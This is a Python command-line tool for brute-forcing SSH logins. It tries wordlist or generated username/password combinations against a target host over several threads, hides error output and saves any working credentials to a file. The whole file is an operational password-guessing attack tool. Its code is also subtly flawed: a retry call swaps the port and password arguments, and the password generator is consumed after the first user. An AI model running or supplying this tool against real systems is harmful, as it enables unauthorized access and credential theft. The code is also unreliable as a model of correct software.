import paramiko
import time
import socket
from colorama import init, Fore
import argparse
import itertools
import queue
import string
import sys
from threading import Thread
import contextlib
import os

init()

GREEN = Fore.GREEN
BLUE = Fore.BLUE
RESET = Fore.RESET
RED = Fore.RED

q = queue.Queue()


@contextlib.contextmanager
def suppress_stderr():
    with open(os.devnull, 'w') as devnull:
        old_stderr = sys.stderr
        sys.stderr = devnull
        try:
            yield
        finally:
            sys.stderr = old_stderr


def is_ssh_open(hostname, username, password, port, retry_count=3, retry_delay=10):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        with suppress_stderr():
            client.connect(hostname=hostname, port=port, username=username, password=password, timeout=3)
    except socket.timeout:
        print(f"{RED}[!] Host: {hostname} is unreachable, timed out.{RESET}")
        return False
    except paramiko.AuthenticationException:
        print(f"{RED}[-] Invalid credentials for {username}:{password}{RESET}")
        return False
    except paramiko.SSHException as e:
        if retry_count > 0:
            print(f"{BLUE}[*] SSH Exception: {str(e)}{RESET}")
            print(f"{BLUE}[*] Retrying in {retry_delay} seconds...{RESET}")
            time.sleep(retry_delay)
            return is_ssh_open(hostname, username, port, password, retry_count-1, retry_delay * 2)
        else:
            print(f"{RED}[!] Maximum retries reached. Skipping {username}:{password}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Unexpected error: {str(e)}{RESET}")
        return False
    else:
        print(f"{GREEN}[+] Found combo:\n\tHOSTNAME: {hostname}\n\tUSERNAME: {username}\n\tPASSWORD: {password}{RESET}")
        return True


def load_lines(file_path):
    with open(file_path, 'r') as file:
        lines = file.read().splitlines()
    return lines


def generate_passwords(min_length, max_length, chars):
    for length in range(min_length, max_length + 1):
        for password in itertools.product(chars, repeat=length):
            yield ''.join(password)


def worker(host, port):
    while not q.empty():
        username, password = q.get()
        if is_ssh_open(host, username, password, port):
            with open('credentials.txt', 'a') as f:  # append mode
                f.write(f"{username}@{host}:{password}\n")
            q.queue.clear()
            break
        q.task_done()


def main():
    parser = argparse.ArgumentParser(description='SSH Bruteforce')
    parser.add_argument('host', help='Hostname or IP address of SSH server.')
    parser.add_argument('-p', '--passlist', help='Password file for brute force.')
    parser.add_argument('-u', '--user', help='Host username.')
    parser.add_argument('-U', '--userlist', type=str, help='Path to the usernames list.')
    parser.add_argument('-w', '--wordlist', type=str, help='Path to the passwords list.')
    parser.add_argument('--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-g', '--generate', action='store_true', help='Generate passwords on the fly.')
    parser.add_argument('--min_length', type=int, help='Minimum length for password generation.', default=1)
    parser.add_argument('--max_length', type=int, help='Maximum length for password generation.', default=4)
    parser.add_argument('-c', '--chars', type=str, help='Characters to use for password generation.',
                        default=string.ascii_letters + string.digits)
    parser.add_argument('-t', '--threads', type=int, default=4, help='Number of threads to use.')

    args = parser.parse_args()

    host = args.host
    port = args.port
    threads = args.threads

    if not args.user and not args.userlist:
        print("Please provide a single username or a userlist file.")
        sys.exit(1)

    if args.userlist:
        users = load_lines(args.userlist)
    else:
        users = [args.user]

    if args.wordlist:
        passwords = load_lines(args.wordlist)
    elif args.generate:
        passwords = generate_passwords(args.min_length, args.max_length, args.chars)
    else:
        print('Please provide a wordlist file or specify to generate passwords.')
        sys.exit(1)

    if args.wordlist:
        print(f"[+] Usernames to try: {len(users)}")
        print(f"[+] Passwords to try: {len(passwords)}")
    else:
        print(f"[+] Usernames to try: {len(users)}")
        print(f"[+] Generating passwords on the fly")

    for user in users:
        if args.wordlist:
            for password in passwords:
                q.put((user, password))
        else:
            for password in passwords:
                q.put((user, password))

    for _ in range(threads):
        thread = Thread(target=worker, args=(host, port))
        thread.daemon = True
        thread.start()

    q.join()


if __name__ == '__main__':
    main()
